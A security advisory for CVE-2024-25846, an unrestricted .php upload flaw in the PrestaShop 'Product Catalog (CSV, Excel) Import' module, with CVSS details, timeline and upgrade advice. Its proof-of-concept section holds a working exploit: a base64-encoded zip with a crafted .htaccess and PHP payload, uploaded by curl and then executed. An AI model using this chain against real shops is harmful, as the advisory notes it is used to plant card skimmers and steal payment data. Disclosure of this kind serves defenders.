---
layout: post
title: "[CVE-2024-25846] Unrestricted Upload of File with Dangerous Type in MyPrestaModules - Product Catalog (CSV, Excel) Import module for PrestaShop"
categories: modules
author:
- TouchWeb.fr
- 202 Ecommerce
- Friends-Of-Presta.org
meta: "CVE,PrestaShop,simpleimportproduct"
severity: "critical (10)"
---

In the module "Product Catalog (CSV, Excel) Import" (simpleimportproduct) up to version 6.7.0 from MyPrestaModules for PrestaShop, a guest can upload files with extensions .php.


## Summary

* **CVE ID**: [CVE-2024-25846](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25846)
* **Published at**: 2024-02-27
* **Platform**: PrestaShop
* **Product**: simpleimportproduct
* **Impacted release**: <= 6.7.0 (6.7.1 ""fixed"" the vulnerability - See note below)
* **Product author**: MyPrestaModules
* **Weakness**: [CWE-434](https://cwe.mitre.org/data/definitions/434.html)
* **Severity**: critical (10)

## Description

The method `Send::__construct()` allows the upload of .zip files, which can be auto uncompress in a predictable directory, author tries to protect it with a.htaccess, but since we can forge a zip with a custom .htaccess and a PHP payload, it will lead to a critical vulnerability [CWE-94](https://cwe.mitre.org/data/definitions/94.html).

**WARNING** : Be warned that this exploit will bypass the majority of WAF (zipped payload with htaccess auto-hijacked)

Note : The author has moved its exposed ajax script which suffers a critical issue to the front controller under an unpredictable token. It remains a critical vulnerability issue with a CVSS 3.1 score [9.1/10](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)

**Edit 2024-07-09 - WARNING** : This exploit is actively used to deploy webskimmer to massively steal credit cards. Since POC is now exploited, it is considered public.

## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: none
* **User interaction**: none
* **Scope**: changed
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: high

**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

## Possible malicious usage

* Obtain admin access
* Remove data from the associated PrestaShop
* Steal data

## Proof of concept

```bash
echo 'UEsDBBQAAAAIACmivFa0Sii9DgAAAA4AAAAJAAAALmh0YWNjZXNzS8zJyS9XSCvKz1UAMgFQSwMEFAAAAAgAoqG8Vp+ixh8WAAAAFAAAAAUAAABhLnBocLOxL8go4OVKTc7IV9AwMtQ2MtS0BgBQSwECHwAUAAAACAAporxWtEoovQ4AAAAOAAAACQAkAAAAAAAAACAAAAAAAAAALmh0YWNjZXNzCgAgAAAAAAABABgA59XXo5CR2QHn1dejkJHZAeJTwpqQkdkBUEsBAh8AFAAAAAgAoqG8Vp+ixh8WAAAAFAAAAAUAJAAAAAAAAAAgAAAANQAAAGEucGhwCgAgAAAAAAABABgA07RBDJCR2QHTtEEMkJHZAaRqZqCOkdkBUEsFBgAAAAACAAIAsgAAAG4AAAAAAA==' > tmp && base64 -d tmp > test.zip && curl -v -F "file=@test.zip" 'https://preprod.X/modules/simpleimportproduct/classes/send.php?zip_file=1&ajax=1&stepTwo=1&import_settings_name=1' && curl -v 'https://preprod.X/modules/simpleimportproduct/data/zip_files/a.php'
```

## Other recommendations

* It’s recommended to upgrade to the latest version of the module **simpleimportproduct**.
* Activate OWASP 933's rules on your WAF (Web application firewall), be warned that you will probably break your backoffice and you will need to pre-configure some bypasses against this set of rules.

## Timeline

| Date | Action |
|--|--|
| 2023-05-28 | Issue discovered during a code review by [TouchWeb.fr](https://www.touchweb.fr) |
| 2023-05-28 | Contact PrestaShop Addons security Team to confirm version scope |
| 2023-06-01 | PrestaShop Addons security Team confirms version scope |
| 2023-11-15 | Author provide a patch |
| 2024-02-22 | Received CVE ID |
| 2024-02-27 | Publish this security advisory |

## Links

* [PrestaShop addons product page](https://addons.prestashop.com/fr/import-export-de-donnees/19091-catalogue-de-produits-csv-excel-dimportation.html)
* [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2024-25846)
